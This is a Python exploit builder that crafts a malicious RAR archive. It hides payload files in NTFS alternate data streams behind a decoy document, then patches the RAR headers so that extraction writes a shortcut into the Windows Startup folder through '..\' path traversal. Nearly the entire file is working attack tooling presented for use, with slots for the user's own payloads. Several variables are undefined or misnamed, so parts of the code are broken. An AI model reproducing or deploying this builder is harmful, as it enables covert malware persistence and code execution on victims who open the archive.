import os
import struct
import subprocess
import zlib
import sys
import shutil
from pathlib import Path
from typing import List

# --- Configuration ---

# 1. Dir storing our payloads
PAYLOADS_DIR = Path("payloads")

# 2. Map our payload to corresponding destination
#    Định dạng: (tên_tệp_trong_thư_mục_payloads, đường_dẫn_giải_nén_ra)
PAYLOAD_MAPPING: List[Tuple[str, str]] = [
    # Payload 1
    ("payload.lnk", "..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\important_update.lnk"),

    # Payload 2
    ("image.png", "C:\\Users\\Public\\Downloads\\logo.png"),

    # Payload 3
    # Add your own    
]

# The sacrificial text file that will carry all the ADS payloads.
TXT_CARRIER_FILENAME = "metadata.txt" 
TXT_CARRIER_CONTEXT = "123456"
PLACEHOLDER_LEN = 150 # Ensure this is long enough for the longest path
OUT_RAR = "exploit.rar"
NUM_DEPTHS = 4  # The number of traversal paths (and ADS streams) to create.
BASE_DROP_PATH = "..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.lnk"

# PAYLOAD = b"@echo off\necho Payload executed!\npause\n"



# --- Constants ---
RAR5_SIG = b"Rar!\x1A\x07\x01\x00"

def prepare_payload() -> Path:
    """Creates payload.bat."""
    payload = Path("payload.bat")
    payload.write_bytes(PAYLOAD)
    return payload

def prepare_payload_files():
    """Check payload folders"""
    print(f"Check payload dir: '{PAYLOADS_DIR}'...")
    PAYLOADS_DIR.mkdir(exist_ok=True)
    
    all_files_ok = True
    for source_filename, _ in PAYLOAD_MAPPING:
        file_path = PAYLOADS_DIR / source_filename
        if not file_path.exists():
            print(f"  [Warning] Not found '{file_path}'.")
            print(f"  Creating sample... Please replace with your own file")
            
            # Tạo file mẫu dựa trên phần mở rộng
            if source_filename.endswith('.txt'):
                file_path.write_text(f"Sample context {source_filename}")
            else: # Đối với các file nhị phân, chỉ tạo file rỗng
                file_path.touch()
            all_files_ok = False
            
    if not all_files_ok:
        print("\n!!! Please check your dir 'payloads' and run script AGAIN !!!")
        sys.exit(1)
    print("ALL payloads are ready")

def create_txt_carrier() -> Path:
    """Creates the simple .txt file to carry the ADS."""
    carrier = Path(TXT_CARRIER_FILENAME)
    carrier.write_text(TXT_CARRIER_CONTEXT, encoding="utf-8")
    return carrier

def attach_ads(carrier: Path, placeholder: str, payload_file: Path):
    """Attaches a payload stream to the carrier file."""
    ads_path = f"{carrier}:{placeholder}"
    with open(ads_path, "wb", buffering=0) as f:
        f.write(payload_file.read_bytes())

def find_rar() -> str:
    """Finds the WinRAR executable."""
    candidates = [r"C:\Program Files\WinRAR\rar.exe", r"C:\Program Files (x86)\WinRAR\rar.exe"]
    for d in os.environ.get("PATH", "").split(os.pathsep):
        if d and (p := Path(d) / "rar.exe").exists():
            return str(p)
    for c in candidates:
        if Path(c).exists():
            return c
    raise FileNotFoundError("rar.exe not found")

def create_base_rar(rar_exe: str, files_to_add: List[Path]) -> Path:
    """Creates a base RAR containing all specified files."""
    base_rar = Path("base.rar")
    if base_rar.exists():
        base_rar.unlink()
    files_str = " ".join(f'"{f}"' for f in files_to_add)
    subprocess.run(
        f'"{rar_exe}" a -ep -os "{base_rar}" {files_str}',
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=True
    )
    return base_rar

def get_vint(buf: bytes, off: int) -> tuple[int, int]:
    val, shift, i = 0, 0, off
    while i < len(buf):
        b = buf[i]; i += 1
        val |= (b & 0x7F) << shift
        if (b & 0x80) == 0: break
        shift += 7
    return val, i - off

def patch_placeholder_in_header(hdr: bytearray, placeholder_utf8: bytes, target_utf8: bytes) -> int:
    """Finds and replaces a placeholder in a header."""
    needle = b":" + placeholder_utf8
    pos = hdr.find(needle)
    if pos < 0:
        return 0
    
    start_of_patch = pos + 1
    # Find the full placeholder name (including the numeric suffix)
    full_placeholder_in_hdr = b""
    for k in range(start_of_patch, len(hdr)):
        if hdr[k] == 0: break
        full_placeholder_in_hdr += bytes([hdr[k]])

    if len(target_utf8) > len(full_placeholder_in_hdr):
        raise ValueError("Replacement path is longer than the placeholder space.")

    hdr[start_of_patch : start_of_patch + len(target_utf8)] = target_utf8
    padding_len = len(full_placeholder_in_hdr) - len(target_utf8)
    if padding_len > 0:
        padding_start = start_of_patch + len(target_utf8)
        hdr[padding_start : padding_start + padding_len] = b"\x00" * padding_len
        
    return 1

def rebuild_all_header_crc(buf: bytearray):
    """Recalculates CRC for all headers."""
    pos = buf.find(RAR5_SIG) + len(RAR5_SIG)
    while pos + 4 <= len(buf):
        block_start = pos
        try:
            header_size, hsz_len = get_vint(buf, block_start + 4)
        except Exception: break
        
        header_start = block_start + 4 + hsz_len
        header_end = header_start + header_size
        if header_end > len(buf): break
        
        region = buf[block_start + 4:header_end]
        crc = zlib.crc32(region) & 0xFFFFFFFF
        struct.pack_into("<I", buf, block_start, crc)
        
        i = header_start
        _htype, n1 = get_vint(buf, i); i += n1
        hflags, n2 = get_vint(buf, i); i += n2
        if (hflags & 0x0001): _extrasz, n3 = get_vint(buf, i); i += n3
        datasz = 0
        if (hflags & 0x0002): datasz, n4 = get_vint(buf, i); i += n4
        pos = header_end + datasz

def build_relative_paths() -> List[str]:
    """Generates the list of traversal paths."""
    return [("..\\" * depth) + BASE_DROP_PATH for depth in range(1, NUM_DEPTHS + 1)]

# --- KEY CHANGE: Using the original, robust patching logic ---
def patch_rar(base_rar: Path, placeholder: str, relative_paths: List[str]) -> Path:
    """Sequentially patches each placeholder it finds."""
    print("Patching path:")
    for path in relative_paths:
        print(f"  - {path}")
    
    data = bytearray(base_rar.read_bytes())
    placeholder_utf8 = placeholder.encode("utf-8")
    target_paths_utf8 = [p.encode("utf-8") for p in relative_paths]
    
    path_index_to_use = 0
    total_patches = 0
    pos = data.find(RAR5_SIG) + len(RAR5_SIG)

    while pos + 4 <= len(data) and path_index_to_use < len(target_paths_utf8):
        try:
            header_size, hsz_len = get_vint(data, pos + 4)
        except Exception: break
        
        header_start = pos + 4 + hsz_len
        header_end = header_start + header_size
        if header_end > len(data): break
        
        hdr = bytearray(data[header_start:header_end])
        target_utf8 = target_paths_utf8[path_index_to_use]
        
        # Search the current header for our placeholder base string.
        patches_in_this_header = patch_placeholder_in_header(hdr, placeholder_utf8, target_utf8)
        
        if patches_in_this_header > 0:
            data[header_start:header_end] = hdr
            total_patches += patches_in_this_header
            print(f"Patched stream for depth {path_index_to_use + 1}")
            path_index_to_use += 1 # Only move to the next path if we made a patch.
        
        i = header_start
        _htype, n1 = get_vint(data, i); i += n1
        hflags, n2 = get_vint(data, i); i += n2
        if (hflags & 0x0001): _extrasz, n3 = get_vint(data, i); i += n3
        datasz = 0
        if (hflags & 0x0002): datasz, n4 = get_vint(data, i); i += n4
        pos = header_end + datasz

    if total_patches < len(target_paths_utf8):
        print(f"Warning: Only patched {total_patches} of {len(target_paths_utf8)} streams.")

    rebuild_all_header_crc(data)
    final_rar = Path(OUT_RAR)
    final_rar.write_bytes(data)
    return final_rar

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} \"path\\to\\your\\decoy_file.pdf\"")
        sys.exit(1)

    decoy_file_path = Path(sys.argv[1])
    if not decoy_file_path.is_file():
        print(f"Error: Decoy file not found at '{decoy_file_path}'")
        sys.exit(1)

    print(f"Using '{decoy_file_path.name}' as the visual decoy.")


    ## ==== Step 1: Preparing payloads === ##


    prepare_payload_files()

    num_payloads = len(PAYLOAD_MAPPING)
    source_file = [PAYLOADS_DIR / item[0] for item in PAYLOAD_MAPPING]
    relative_paths = [item[1] for item in PAYLOAD_MAPPING]

    txt_carrier = create_txt_carrier()


    ## === Step 2: Create placeholders and attach to ADS ===


    base_placeholder = "X" * (PLACEHOLDER_LEN - 5)
    placeholders = [f"{base_placeholder}{i:02d}" for i in range(num_payloads)]
    
    print(f"Attaching {num_payloads} ADS streams to '{txt_carrier.name}'...")
    
    for i, p_holder in enumerate(placeholders):
        source_file = source_files[i]
        attach_ads(txt_carrier, p_holder, source_file)
        print(f"  - Attached '{source_file.name}'")


    ## === Step 3: Create and patch our RAR ===


    rar_exe = find_rar()
    print(f"Creating base RAR with '{decoy_file_path.name}' and '{txt_carrier.name}'...")
    create_base_rar(rar_exe, [decoy_file_path, txt_carrier])
    
    relative_paths = build_relative_paths()
    
    print("Patching RAR...")
    try:
        # We pass the common base part of the placeholder to the patching function.
        final_rar = patch_rar(Path("base.rar"), base_placeholder, relative_paths)
    except Exception as e:
        print(f"Patching failed: {e}")
        return
    finally:
        if Path("base.rar").exists(): Path("base.rar").unlink()
        payload.unlink()
        txt_carrier.unlink()
    
    print(f"\nExploit created: {final_rar}")
    print(f"Archive contains '{decoy_file_path.name}' and '{TXT_CARRIER_FILENAME}'.")
    print(f"The payload will attempt {num_payloads} drops on extraction.")

if __name__ == "__main__":
    main()